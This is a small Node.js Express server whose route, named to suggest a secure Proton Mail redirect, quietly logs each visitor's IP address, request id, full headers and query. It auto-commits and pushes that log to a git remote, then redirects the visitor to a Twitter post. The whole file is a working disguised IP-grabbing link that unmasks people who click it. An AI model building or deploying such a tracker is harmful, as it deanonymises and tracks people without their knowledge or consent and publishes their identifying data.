const express = require("express");
const sh = require("shelljs");
const fs = require('fs')
const app = express();
const port = 3128;

app.get("/proton-mail-secure-redirect", (req, res) => {
  // Get IP
  var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  
  // Console log
  console.log(`Got request with id: ${req.query.id}`);
  
  // Write to the log file
  fs.writeFileSync('log.txt', `Got request with ID «${req.query.id}» from IP:«${ip}»\n`, { flag: 'a+' });
  
  // Log the full request 
  fs.writeFileSync('log.txt', JSON.stringify(req.headers) + "\n", { flag: 'a+' });
  fs.writeFileSync('log.txt', JSON.stringify(req.query) + "\n", { flag: 'a+' });
  fs.writeFileSync('log.txt', JSON.stringify([req.ip, req.ips]) + "\n\n", { flag: 'a+' });

  // Auto-commit 
  sh.exec(`git commit -a -m 'auto-commit of log.txt'`);
  sh.exec(`git push`);

  // Actual redirect
  res.redirect(301, "https://twitter.com/_nat_ali/status/1308893338553200643?lang=en");

});

app.listen(port, () => {
  console.log(`Express app listening at http://localhost:${port}`);
});

// localhost:3128/proton-mail-secure-redirect?id=test
